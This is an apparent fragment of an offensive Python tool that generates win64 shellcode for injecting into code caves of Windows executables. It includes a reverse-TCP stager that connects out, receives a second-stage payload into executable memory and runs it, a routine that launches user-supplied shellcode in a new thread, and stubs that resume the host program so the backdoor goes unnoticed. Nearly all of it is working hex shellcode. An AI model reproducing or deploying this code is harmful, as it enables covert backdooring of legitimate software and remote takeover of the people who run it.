                            "\x57\x53\x41\x53\x74\x61"                       # WSAStartup
                            "\x72\x74\x75\x70\x00\x00"                       # ...
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # Call qword ptr [r15] ; GetProcAddr
                            "\x48\x95"                                       # xchg rbp, rax ; mov wsastartup to rbp
                            # wsastartup to rbp
                            "\xeb\x0c"                                       # jmp over WSASocketA
                            "\x57\x53\x41\x53\x6f\x63"                       # WSASocketA
                            "\x6b\x65\x74\x41\x00\x00"                       #
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x4C\x89\xE9"                                   # mov rcx, r13
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WSASocketA
                            "\x49\x94"                                       # xchg r12, rax ; mov WSASocketA to r12
                            # WSASocketA to r12
                            "\x48\x89\xF2"                                   # mov rdx, rsi ; mov point to struct
                            "\x68\x01\x01\x00\x00"                           # push 0x0101
                            "\x59"                                           # pop rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20

                            "\xff\xd5"                                       # call rbp ; WSAStartup(0x0101, &WSAData);

                            "\x50"                                           # push rax
                            "\x50"                                           # push rax
                            "\x4D\x31\xC0"                                   # xor r8, r8
                            "\x4D\x31\xC9"                                   # xor r9, r9
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC2"                                   # mov rdx, rax
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC1"                                   # mov rdx, rax
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\xD4"                                   # call r12 ;WSASocketA(AF_INT, SOCK_STREAM, 0 0 0 0)
                            "\x49\x94"                                       # xchg r12, rax ; mov socket to r12
                            # get connect
                            "\x48\xBA\x63\x6F\x6E\x6E\x65\x63\x74\x00"       # mov rdx, "connect\x00"
                            "\x52"                                           # push rdx
                            "\x48\x89\xE2"                                   # mov rdx, rsp
                            "\x4C\x89\xE9"                                   # mov rcx, r13; ws2_32 handle
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] ;GetProcAddr connect
                            "\x48\x89\xC3"                                   # mov rbx, rax ;connect api
                            "\x6A\x10"                                       # push 16
                            "\x41\x58"                                       # pop r8
                            "\x48\x89\xFA"                                   # mov rdx, rdi
                            "\x4C\x89\xE1"                                   # mov rcx, r12
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
                            )
        # socket is in r12
        # rdi has the struct for the socket
        # r14: GetProcAddress
        # r15: LoadLibraryA
        # r13 has ws2_32 handle
        # reminder: RCX, RDX, R8, R9 for the first four integer or pointer arguments
        self.shellcode2 += ("\x90\x90\x90\x90"
                            #get recv handle
                            "\x4C\x89\xE9"                                  # mov rcx, r13 ; ws2_32 handle in rcx
                            "\x48\xBA\x72\x65\x63\x76\x00\x00\x00\x00"      # mov rdx, recv
                            "\x52"                                          # push rdx
                            "\x48\x89\xe2"                                  # mov rdx, rsp
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17"                                  # call qword ptr [r15]; getprocaddr recv
                            "\x49\x89\xC5"                                  # mov r13, rax ; don't need ws2_32 handle
                            "\x48\x81\xC4\xD0\x02\x00\x00"                  # add rsp, 0x2F8
                            "\x48\x83\xec\x10"                              # sub rsp, 16
                            "\x48\x89\xe2"                                  # mov rdx, rsp
                            "\x4D\x31\xC9"                                  # xor r9, r9
                            "\x6a\x04"                                      # push byte 0x4
                            "\x41\x58"                                      # pop r8
                            "\x4C\x89\xE1"                                  # mov rcx, r12; socket
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\xD5"                                  # call r13; recv
                            "\x48\x83\xC4\x20"                              # add rsp, 32 ;need to restore the stack
                            "\x5e"                                          # pop rsi ; size of second stage
                            )
        self.shellcode2 += ("\x48\x31\xD2"                                  # xor rdx, rdx
                            "\x65\x48\x8B\x52\x60"                          # mov rdx, QWORD ptr gs: [rdx+0x60]
                            "\x48\x8B\x52\x10"                              # mov rdx, QWORD ptr [rdx + 10]
                            )
        # rdx now module entry
        self.shellcode2 += "\x49\xBE"                                       # mov value below to r14

        if flItms['VirtualAlloc'] - flItms['ImageBase'] < 0:
            self.shellcode2 += struct.pack("<Q", 0xffffffff + (flItms['VirtualAlloc'] - flItms['ImageBase'] + 1))
        else:
            self.shellcode2 += struct.pack("<Q", flItms['VirtualAlloc'] - flItms['ImageBase'])
        self.shellcode2 += "\x49\x01\xD6"  # add r14 + RDX
        # r14 now holds VirtualAlloc

        self.shellcode2 += ("\x6a\x40"                                      # push byte 0x40
                            "\x41\x59"                                      # pop r9
                            "\x68\x00\x10\x00\x00"                          # push 0x1000
                            "\x41\x58"                                      # pop r8
                            "\x48\x89\xf2"                                  # mov rdx, rsi
                            "\x48\x31\xc9"                                  # xor rcx, rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xff\x16"                                  # call r14; call VirtualAlloc
                            "\x48\x89\xc3"                                  # mov rbx, rax
                            "\x49\x89\xC7"                                  # mov r15, rax
                            "\x4D\x31\xC9"                                  # xor r9, r9
                            "\x49\x89\xF0"                                  # mov r8, rsi
                            "\x48\x89\xDA"                                  # mov rdx, rbx
                            "\x4C\x89\xE1"                                  # mov rcx, r12
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\xD5"                                  # call r13; recv
                            "\x48\x01\xC3"                                  # add rbx, rax
                            "\x48\x29\xC6"                                  # sub rsi, rax
                            "\x48\x85\xF6"                                  # test rsi, rsi
                            "\x75\xe2"                                      # jnz short -X
                            "\x4C\x89\xE7"                                  # mov rdi, r12 ; socket to rdi
                            "\x41\xFF\xE7"                                  # jmp r15
                            )

        breakupvar = eat_code_caves(flItms, 0, 1)

        #allocate
        self.shellcode1 = "\xfc"
        self.shellcode1 += "\x49\xBE"                                       # mov value below to r14

        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
        # RDX holds entry point
        self.shellcode1 += "\x49\x01\xD6"                                   # add r14 + RDX
        self.shellcode1 += "\x49\xBF"                                       # mov value below to r15
        if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
        self.shellcode1 += "\x49\x01\xD7"                                   # add r15 + RDX

        # r14 virtualalloc
        # r15 createthread

        self.shellcode1 += ("\x5d"                                          # pop rbp
                            "\x49\xc7\xc5"                                  # mov r13, size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += ("\x6a\x40"                                      # push 40h
                            "\x41\x59"                                      # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"                          # push 1000h
                            "\x41\x58"                                      # pop r8.. now 1000h
                            "\x4C\x89\xEA"                                  # mov rdx, r13
                            "\x6A\x00"                                      # push 0
                            "\x59"                                          # pop rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x16"                                  # call qword ptr [r14]
                            "\x48\x89\xc3"                                  # mov rbx, rax      ; Store allocated address in rbx
                            "\x48\x89\xc7"                                  # mov rdi, rax      ; Prepare RDI with the new address
                            )
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x41"

                            # got_payload:
        self.shellcode1 += ("\x5e"                                          # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                                      # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                          # call set_handler   ; Configure error handling
                            #^^^^ I could delete this need to fix jmp, call, and stack
                            #set_handler:
                            "\x48\x31\xC0"                                  # xor rax,rax
                            "\x50"                                          # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                          # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                                  # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17"                                  # call qword ptr [r15]
                            "\x48\x83\xC4\x50"                              # add rsp, 50

                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def iat_user_supplied_shellcode_threaded(self, flItms, CavesPicked={}):
        """
        Completed IAT based payload includes spawning of thread.
        """

        flItms['stager'] = True

        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
                                 'VirtualAlloc', 'CreateThread']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        #overloading stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        breakupvar = eat_code_caves(flItms, 0, 1)

        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 99).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 99).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 71).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xBA\xFF\xFF\xFF"

        #Can inject any shellcode below.
        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 90

        self.shellcode2 += self.supplied_shellcode

        breakupvar = eat_code_caves(flItms, 0, 1)

        #allocate
        self.shellcode1 = "\xfc"
        self.shellcode1 += "\x49\xBE"                                       # mov value below to r14

        if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
        # RDX holds entry point
        self.shellcode1 += "\x49\x01\xD6"                                   # add r14 + RDX
        self.shellcode1 += "\x49\xBF"                                       # mov value below to r15
        if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
            self.shellcode1 += struct.pack("<Q", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
        else:
            self.shellcode1 += struct.pack("<Q", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
        self.shellcode1 += "\x49\x01\xD7"                                   # add r15 + RDX

        # r14 virtualalloc
        # r15 createthread

        self.shellcode1 += ("\x5d"                                          # pop rbp
                            "\x49\xc7\xc5"                                  # mov r13, size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += ("\x6a\x40"                                      # push 40h
                            "\x41\x59"                                      # pop r9 now 40h
                            "\x68\x00\x10\x00\x00"                          # push 1000h
                            "\x41\x58"                                      # pop r8.. now 1000h
                            "\x4C\x89\xEA"                                  # mov rdx, r13
                            "\x6A\x00"                                      # push 0
                            "\x59"                                          # pop rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x16"                                  # call qword ptr [r14]
                            "\x48\x89\xc3"                                  # mov rbx, rax      ; Store allocated address in rbx
                            "\x48\x89\xc7"                                  # mov rdi, rax      ; Prepare RDI with the new address
                            )
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x41"

                            # got_payload:
        self.shellcode1 += ("\x5e"                                          # pop rsi            ; Prepare ESI with the source to copy
                            "\xf2\xa4"                                      # rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                          # call set_handler   ; Configure error handling
                            #^^^^ I could delete this need to fix jmp, call, and stack
                            #set_handler:
                            "\x48\x31\xC0"                                  # xor rax,rax
                            "\x50"                                          # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                          # push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                                  # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17"                                  # call qword ptr [r15]
                            "\x48\x83\xC4\x50"                              # add rsp, 50

                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)

        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def cave_miner_inline(self, flItms, CavesPicked={}):
        """
        Sample code for finding sutable code caves
        """

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = ""

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                self.shellcode1 += "\xe9"
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar -
                                                   len(self.stackpreserve) - len(self.shellcode1) - 3)
        #else:
        #    self.shellcode1 += "\xc0\x00\x00\x00"

        self.shellcode1 += ("\x90" * 13)

        self.shellcode2 = ("\x90" * 19)

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

##########################################################
#                 END win64 shellcodes                   #
##########################################################
